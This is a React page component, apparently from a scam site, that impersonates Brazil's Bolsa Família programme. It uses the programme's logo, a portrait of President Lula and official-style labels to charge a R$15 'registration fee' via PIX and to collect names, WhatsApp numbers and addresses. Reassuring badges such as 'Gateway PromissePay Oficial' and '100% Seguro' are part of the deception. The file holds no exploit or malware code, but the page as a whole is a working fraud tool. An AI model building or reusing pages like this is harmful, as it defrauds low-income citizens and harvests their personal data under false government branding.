import { createFileRoute, Link } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import {
  ArrowLeft,
  Check,
  Copy,
  ExternalLink,
  Loader2,
  Lock,
  QrCode,
  ShieldCheck,
  Sparkles,
  HelpCircle,
  Clock,
  CheckCircle2,
} from "lucide-react";
import { toast } from "sonner";
import { brl } from "@/lib/pricing";
import {
  criarCobrancaPromissePay,
  consultarTransacaoPromissePay,
  consultarStatusWebhook,
} from "@/lib/promissepay";
import { SiteHeader } from "@/components/SiteHeader";
import { SiteFooter } from "@/components/SiteFooter";
import logoBolsaFamilia from "@/assets/logo-bolsa-familia.png";
import retratoLula from "@/assets/retrato-lula.png";

export const Route = createFileRoute("/pagamento")({
  head: () => ({
    meta: [
      { title: "Pagamento da Taxa Cadastral | SEU Benefício 2027" },
      { name: "description", content: "Pagamento seguro e instantâneo via PIX da taxa cadastral SEU Benefício 2027." },
      { property: "og:title", content: "Pagamento da Taxa Cadastral | SEU Benefício 2027" },
      { property: "og:description", content: "Emissão prioritária da regularização cadastral via PIX com aprovação imediata." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: PagamentoPage,
});

const PROGRESS_KEY = "seubeneficio-progress";

function PagamentoPage() {
  const [f, setF] = useState({
    nome: "",
    tel: "",
    cep: "",
    rua: "",
    num: "",
    bairro: "",
    cidade: "",
    uf: "",
  });

  const [loadingCep, setLoadingCep] = useState(false);
  const [pago, setPago] = useState(false);
  const [pixCopiado, setPixCopiado] = useState(false);
  const [gerandoPix, setGerandoPix] = useState(false);
  const [transacaoId, setTransacaoId] = useState("");
  const [pixCode, setPixCode] = useState("");
  const [qrUrl, setQrUrl] = useState("");
  const [pagamentoConfirmado, setPagamentoConfirmado] = useState(false);

  const valor = 15;

  // Carrega respostas salvas do questionário
  useEffect(() => {
    try {
      const saved = sessionStorage.getItem(PROGRESS_KEY);
      if (saved) {
        const parsed = JSON.parse(saved);
        setF((prev) => ({
          ...prev,
          cidade: parsed.city || prev.cidade,
          uf: parsed.uf || prev.uf,
        }));
      }
    } catch {
      /* ignore */
    }
  }, []);

  const set = (k: keyof typeof f) => (e: React.ChangeEvent<HTMLInputElement>) =>
    setF((prev) => ({ ...prev, [k]: e.target.value }));

  const buscarCep = async () => {
    const d = f.cep.replace(/\D/g, "");
    if (d.length !== 8) return;
    try {
      setLoadingCep(true);
      const res = await fetch(`https://viacep.com.br/ws/${d}/json/`);
      const r = await res.json();
      if (r.erro) {
        toast.error("CEP não encontrado");
        return;
      }
      setF((x) => ({
        ...x,
        rua: r.logradouro || x.rua,
        bairro: r.bairro || x.bairro,
        cidade: r.localidade || x.cidade,
        uf: r.uf || x.uf,
      }));
      toast.success("Endereço preenchido com sucesso!");
    } catch {
      toast.error("Não foi possível consultar o CEP");
    } finally {
      setLoadingCep(false);
    }
  };

  // Polling automático: verifica status via webhook (rápido) + API da PromissePay (fallback)
  useEffect(() => {
    if (!transacaoId || pagamentoConfirmado) return;
    const interval = setInterval(async () => {
      try {
        // 1. Primeiro verifica via webhook (mais rápido — dados locais)
        const webhookResult = await consultarStatusWebhook({ data: { id: transacaoId } });
        if (webhookResult.paid) {
          setPagamentoConfirmado(true);
          toast.success("Pagamento confirmado via webhook PromissePay! ✅");
          clearInterval(interval);
          return;
        }

        // 2. Fallback: consulta diretamente na API da PromissePay
        const { paid } = await consultarTransacaoPromissePay({ data: { id: transacaoId } });
        if (paid) {
          setPagamentoConfirmado(true);
          toast.success("Pagamento confirmado pela PromissePay! ✅");
          clearInterval(interval);
        }
      } catch {
        /* silencioso */
      }
    }, 4000);
    return () => clearInterval(interval);
  }, [transacaoId, pagamentoConfirmado]);

  const gerarPix = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!f.nome.trim() || !f.tel.trim()) {
      toast.error("Preencha seu nome completo e WhatsApp para continuar.");
      return;
    }

    try {
      setGerandoPix(true);
      const res = await criarCobrancaPromissePay({
        data: { amountInCents: 1500, nome: f.nome, telefone: f.tel },
      });
      if (!res.pixCopiaECola && !res.qrCodeUrl) {
        throw new Error("PromissePay não retornou dados do PIX. Tente novamente.");
      }
      setTransacaoId(res.id);
      setPixCode(res.pixCopiaECola);
      setQrUrl(res.qrCodeUrl);
      setPago(true);
      toast.success("PIX gerado com sucesso pela PromissePay!");
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      toast.error(msg);
    } finally {
      setGerandoPix(false);
    }
  };

  const copiarPix = () => {
    if (navigator?.clipboard?.writeText && pixCode) {
      navigator.clipboard.writeText(pixCode);
      setPixCopiado(true);
      toast.success("Código PIX copiado para a área de transferência!");
      setTimeout(() => setPixCopiado(false), 3000);
    }
  };

  return (
    <div className="min-h-screen bg-[#FFFFFF] text-[#202020] flex flex-col justify-between selection:bg-[#FCEBED] selection:text-[#C8102E]">
      <div>
        {/* Cabeçalho Oficial Vermelho e Branco */}
        <SiteHeader
          canBack={true}
          stepLabel="Emissão via PIX"
          showProgress={true}
          progressPercent={100}
        />

        <main className="animate-step mx-auto max-w-2xl px-4 py-6 sm:py-8">
          {/* Barra Superior / Voltar e Selo */}
          <div className="mb-6 flex items-center justify-between gap-3">
            <Link
              to="/"
              className="inline-flex items-center gap-1.5 rounded-xl border border-[#C8102E] bg-white px-3.5 py-2 text-xs font-bold text-[#C8102E] transition-all hover:bg-[#FCEBED] active:scale-95"
            >
              <ArrowLeft className="size-4" /> Voltar ao resumo
            </Link>
            <div className="inline-flex items-center gap-1.5 rounded-full bg-[#FCEBED] px-3 py-1 text-xs font-bold text-[#A50D24]">
              <Lock className="size-3.5 text-[#C8102E]" /> Pagamento 100% Seguro
            </div>
          </div>

          {/* Banner de Identificação Institucional */}
          <div className="mb-6 flex items-center justify-between gap-4 rounded-2xl border border-[#E5E5E5] bg-white p-4 shadow-soft">
            <div className="flex items-center gap-3">
              <div className="rounded-xl border border-[#E5E5E5] bg-white p-1.5 shadow-xs">
                <img
                  src={logoBolsaFamilia}
                  alt="Bolsa Família"
                  className="h-8 w-auto object-contain"
                  onError={(e) => {
                    if (e.currentTarget.src !== "/logo-bolsa-familia.png") {
                      e.currentTarget.src = "/logo-bolsa-familia.png";
                    }
                  }}
                />
              </div>
              <div className="rounded-xl border border-[#E5E5E5] bg-white p-1 shadow-xs">
                <img
                  src={retratoLula}
                  alt="Lula Presidente"
                  className="h-8 w-auto object-contain"
                  onError={(e) => {
                    if (e.currentTarget.src !== "/retrato-lula.png") {
                      e.currentTarget.src = "/retrato-lula.png";
                    }
                  }}
                />
              </div>
              <div>
                <h2 className="text-sm font-extrabold text-[#202020]">
                  Regularização Cadastral 2027
                </h2>
                <p className="text-[11px] text-[#666666]">
                  Apoio às Famílias · Processamento Imediato
                </p>
              </div>
            </div>

            <div className="hidden sm:block text-right">
              <span className="inline-flex items-center gap-1 rounded-md bg-[#F5F5F5] px-2.5 py-1 text-[11px] font-semibold text-[#555555]">
                <Clock className="size-3 text-[#C8102E]" /> Liberação 24/7
              </span>
            </div>
          </div>

          <header className="mb-6 text-center">
            <div className="mx-auto mb-2 inline-flex items-center gap-2 rounded-full bg-[#FCEBED] px-3.5 py-1 text-xs font-bold text-[#A50D24]">
              <Sparkles className="size-3.5 text-[#C8102E]" /> Gateway PromissePay Oficial
            </div>
            <h1 className="text-2xl sm:text-3xl font-black tracking-tight text-[#202020]">
              Finalizar Emissão Cadastral
            </h1>
            <p className="mx-auto mt-1 max-w-md text-xs sm:text-sm text-[#555555]">
              Efetue o pagamento da taxa cadastral de{" "}
              <strong className="text-[#C8102E]">{brl(valor)}</strong> via{" "}
              <strong>PIX</strong> para emissão imediata do seu comprovante.
            </p>
          </header>

          {pago ? (
            /* Tela de PIX Gerado */
            <div className="space-y-6 rounded-2xl border border-[#E5E5E5] bg-white p-6 sm:p-8 shadow-soft">
              <div className="text-center">
                {pagamentoConfirmado ? (
                  <div className="mx-auto mb-4 grid size-16 place-items-center rounded-2xl bg-emerald-100 text-emerald-700 border border-emerald-300">
                    <Check className="size-9 stroke-[3]" />
                  </div>
                ) : (
                  <div className="mx-auto mb-4 grid size-16 place-items-center rounded-2xl bg-[#FCEBED] text-[#C8102E] border border-[#C8102E]/20">
                    <QrCode className="size-9" />
                  </div>
                )}

                <h2 className="text-2xl font-black text-[#202020]">
                  {pagamentoConfirmado ? "Pagamento Confirmado!" : "Pague com PIX Instantâneo"}
                </h2>
                <p className="mt-1 text-xs sm:text-sm text-[#555555]">
                  {pagamentoConfirmado ? (
                    <>
                      O gateway PromissePay confirmou o recebimento da taxa de{" "}
                      <strong className="text-[#202020]">{brl(valor)}</strong> com sucesso!
                    </>
                  ) : (
                    <>
                      Abra o app do seu banco, escolha pagar via <strong>PIX</strong> e escaneie o QR Code abaixo ou use o código Copia e Cola.
                    </>
                  )}
                </p>
              </div>

              {!pagamentoConfirmado && (
                <>
                  {/* Badge Aguardando */}
                  <div className="flex items-center justify-center gap-2 rounded-xl bg-amber-50 border border-amber-200 px-4 py-2.5 text-xs font-bold text-amber-800">
                    <span className="size-2 rounded-full bg-amber-500 animate-ping" />
                    {transacaoId
                      ? `PromissePay #${transacaoId} · Aguardando pagamento`
                      : "Aguardando pagamento via PIX..."}
                  </div>

                  {/* QR Code */}
                  <div className="flex flex-col items-center justify-center rounded-2xl border-2 border-dashed border-[#C8102E]/30 bg-[#F5F5F5] p-6">
                    {qrUrl ? (
                      <img
                        src={qrUrl}
                        alt={`QR Code PIX PromissePay R$ ${valor.toFixed(2)}`}
                        className="size-56 rounded-xl bg-white p-2 shadow-md transition-transform hover:scale-105"
                      />
                    ) : (
                      <div className="flex size-56 items-center justify-center rounded-xl bg-white border border-[#E5E5E5]">
                        <Loader2 className="size-8 animate-spin text-[#C8102E]" />
                      </div>
                    )}
                    <p className="mt-3 text-xs font-bold text-[#555555]">
                      Valor a pagar: <strong className="text-xl text-[#C8102E]">{brl(valor)}</strong>
                    </p>
                  </div>

                  {/* Copia e Cola */}
                  {pixCode && (
                    <div>
                      <label className="mb-1.5 block text-xs font-bold uppercase tracking-wider text-[#555555]">
                        Código PIX Copia e Cola
                      </label>
                      <div className="relative">
                        <input
                          readOnly
                          value={pixCode}
                          className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-[#F5F5F5] pl-3 pr-32 font-mono text-xs text-[#202020] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20"
                        />
                        <button
                          type="button"
                          onClick={copiarPix}
                          className="absolute right-1.5 top-1.5 flex h-9 items-center gap-1.5 rounded-lg bg-[#C8102E] px-3.5 text-xs font-bold text-white shadow transition hover:bg-[#A50D24] active:scale-95"
                        >
                          {pixCopiado ? (
                            <>
                              <Check className="size-3.5 stroke-[3]" /> Copiado!
                            </>
                          ) : (
                            <>
                              <Copy className="size-3.5" /> Copiar PIX
                            </>
                          )}
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Instruções */}
                  <div className="rounded-xl border border-[#E5E5E5] bg-[#F5F5F5] p-4 text-xs text-[#555555] space-y-1.5">
                    <h3 className="font-black text-[#202020] text-sm mb-2">Instruções de Pagamento:</h3>
                    <ol className="list-inside list-decimal space-y-1">
                      <li>Abra o aplicativo do seu banco ou carteira digital (Nubank, Caixa, Itaú, Bradesco, etc.).</li>
                      <li>Selecione a opção <strong>PIX</strong> (QR Code ou Copia e Cola).</li>
                      <li>Cole o código copiado acima ou aponte a câmera para o QR Code.</li>
                      <li>Confira o valor de <strong>{brl(valor)}</strong> e finalize o pagamento.</li>
                      <li>A aprovação é imediata e esta página será atualizada automaticamente.</li>
                    </ol>
                  </div>
                </>
              )}

              {pagamentoConfirmado && (
                <div className="rounded-2xl border border-emerald-300 bg-emerald-50 p-5 text-center text-sm font-bold text-emerald-800 space-y-1">
                  <p>✓ Processo concluído com êxito!</p>
                  <p className="text-xs font-normal text-emerald-700">
                    O comprovante do seu cadastro 2027 e as orientações foram confirmados no sistema.
                  </p>
                </div>
              )}

              <div className="pt-2 text-center">
                <button
                  type="button"
                  onClick={() => setPago(false)}
                  className="text-xs font-bold text-[#666666] hover:text-[#C8102E] underline underline-offset-4 transition"
                >
                  Alterar dados cadastrais ou gerar novo PIX
                </button>
              </div>
            </div>
          ) : (
            /* Formulário de Cadastro e Pagamento */
            <form
              onSubmit={gerarPix}
              className="space-y-4 sm:space-y-5 rounded-2xl border border-[#E5E5E5] bg-white p-5 sm:p-8 shadow-soft"
            >
              <div className="flex items-center gap-2 border-b border-[#E5E5E5] pb-3 text-xs">
                <span className="size-2 rounded-full bg-emerald-500 animate-pulse" />
                <span className="font-semibold text-[#555555]">
                  Gateway de Processamento: <strong className="text-[#202020]">PromissePay</strong>
                </span>
                <span className="ml-auto rounded-md bg-emerald-100 px-2 py-0.5 text-[10px] font-bold text-emerald-800">
                  Operacional ✓
                </span>
              </div>

              <div>
                <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
                  Nome Completo
                </label>
                <input
                  required
                  placeholder="Digite seu nome completo"
                  value={f.nome}
                  onChange={set("nome")}
                  className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
                />
              </div>

              <div>
                <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
                  WhatsApp com DDD
                </label>
                <input
                  required
                  inputMode="tel"
                  placeholder="(DDD) 99999-9999"
                  value={f.tel}
                  onChange={set("tel")}
                  className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
                />
              </div>

              <div>
                <div className="mb-1 flex items-center justify-between">
                  <label className="block text-xs font-bold uppercase tracking-wider text-[#555555]">
                    CEP (opcional)
                  </label>
                  {loadingCep && (
                    <span className="text-xs font-bold text-[#C8102E] flex items-center gap-1">
                      <Loader2 className="size-3 animate-spin" /> Buscando endereço...
                    </span>
                  )}
                </div>
                <input
                  inputMode="numeric"
                  maxLength={9}
                  placeholder="00000-000"
                  value={f.cep}
                  onChange={set("cep")}
                  onBlur={buscarCep}
                  className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
                />
              </div>

              <div className="grid grid-cols-3 gap-2">
                <div className="col-span-2">
                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
                    Logradouro / Rua
                  </label>
                  <input
                    placeholder="Nome da sua rua"
                    value={f.rua}
                    onChange={set("rua")}
                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
                  />
                </div>
                <div>
                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
                    Número
                  </label>
                  <input
                    placeholder="Nº"
                    value={f.num}
                    onChange={set("num")}
                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 gap-2 sm:grid-cols-3">
                <div>
                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
                    Bairro
                  </label>
                  <input
                    placeholder="Bairro"
                    value={f.bairro}
                    onChange={set("bairro")}
                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
                  />
                </div>
                <div>
                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
                    Cidade
                  </label>
                  <input
                    placeholder="Cidade"
                    value={f.cidade}
                    onChange={set("cidade")}
                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
                  />
                </div>
                <div>
                  <label className="mb-1 block text-xs font-bold uppercase tracking-wider text-[#555555]">
                    UF
                  </label>
                  <input
                    maxLength={2}
                    placeholder="UF"
                    value={f.uf}
                    onChange={set("uf")}
                    className="h-12 w-full rounded-xl border border-[#E5E5E5] bg-white px-4 font-semibold uppercase text-[#202020] placeholder:font-normal placeholder:text-[#888888] focus:border-[#C8102E] focus:outline-none focus:ring-2 focus:ring-[#C8102E]/20 transition-colors"
                  />
                </div>
              </div>

              {/* Seção Exclusiva PIX */}
              <div className="rounded-xl border-2 border-[#C8102E] bg-[#FCEBED] p-4">
                <div className="flex items-center gap-3">
                  <div className="grid size-10 place-items-center rounded-xl bg-[#C8102E] text-white">
                    <QrCode className="size-5" />
                  </div>
                  <div>
                    <p className="text-sm font-black text-[#A50D24]">
                      Forma de Pagamento: PIX Instantâneo
                    </p>
                    <p className="text-xs text-[#555555]">
                      Aprovação imediata 24 horas por dia via PromissePay
                    </p>
                  </div>
                  <span className="ml-auto rounded-md bg-[#C8102E] px-2 py-0.5 text-[10px] font-bold text-white">
                    Instantâneo
                  </span>
                </div>
              </div>

              {/* Resumo do Valor */}
              <div className="rounded-xl border border-[#E5E5E5] bg-[#F5F5F5] p-4 text-sm">
                <div className="flex justify-between text-xs sm:text-sm text-[#555555]">
                  <span>Taxa de Emissão e Regularização 2027</span>
                  <span className="font-bold text-[#202020]">{brl(valor)}</span>
                </div>
                <div className="mt-1 flex justify-between text-xs sm:text-sm text-[#555555]">
                  <span>Taxa de Processamento PromissePay</span>
                  <span className="font-bold text-emerald-700">Grátis (R$ 0,00)</span>
                </div>
                <div className="mt-3 flex items-center justify-between border-t border-[#E5E5E5] pt-3 text-base font-black text-[#202020]">
                  <span>Total a pagar via PIX</span>
                  <span className="text-2xl font-black text-[#C8102E]">{brl(valor)}</span>
                </div>
              </div>

              <button
                type="submit"
                disabled={gerandoPix}
                className="flex h-14 w-full items-center justify-center gap-2 rounded-xl bg-[#C8102E] text-base font-black tracking-wide text-white shadow-primary transition-all duration-200 hover:bg-[#A50D24] hover:-translate-y-0.5 active:translate-y-0 active:scale-[0.99] disabled:opacity-50 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#C8102E] focus-visible:ring-offset-2"
              >
                {gerandoPix ? (
                  <>
                    <Loader2 className="size-5 animate-spin" /> Conectando à PromissePay...
                  </>
                ) : (
                  <>GERAR PIX AGORA — {brl(valor)}</>
                )}
              </button>

              <div className="flex flex-wrap items-center justify-center gap-4 pt-1 text-xs text-[#666666]">
                <span className="flex items-center gap-1">
                  <Lock className="size-3.5 text-[#C8102E]" /> Gateway PromissePay Seguro
                </span>
                <span>·</span>
                <span className="flex items-center gap-1">
                  <ShieldCheck className="size-3.5 text-[#C8102E]" /> Criptografia 256-bit
                </span>
              </div>
            </form>
          )}
        </main>
      </div>

      <SiteFooter />
    </div>
  );
}
